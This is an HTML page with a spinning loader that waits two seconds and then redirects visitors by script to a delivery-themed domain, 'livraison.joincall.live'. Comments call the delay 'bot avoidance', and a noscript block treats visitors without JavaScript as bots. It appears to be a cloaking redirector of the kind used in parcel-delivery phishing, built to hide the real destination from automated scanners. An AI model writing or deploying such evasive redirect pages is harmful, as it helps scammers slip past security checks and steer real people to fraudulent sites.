<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <div class="center-container">
        <span class="loader"></span>
    </div>

    <style>
        body, html {
            height: 100%;
            margin: 0;
        }

        .center-container {
            display: flex;
            justify-content: center; /* Horizontal center */
            align-items: center;     /* Vertical center */
            height: 100%;
        }

        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #FFF;
            border-bottom-color: #cbce14;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <p> <a id="redirect-link" href="https://livraison.joincall.live">click here</a>.</p>

    <script>
        // Simple bot avoidance: wait a bit, then redirect
        setTimeout(function () {
            // Optionally check for browser features (bots often lack them)
            if (navigator.userAgent && navigator.userAgent.length > 0) {
                window.location.href = "https://livraison.joincall.live";
            }
        }, 2000);
    </script>

    <noscript>
        <!-- No JavaScript means probably a bot -->
        <p>JavaScript is required to access this page.</p>
    </noscript>
</body>
</html>
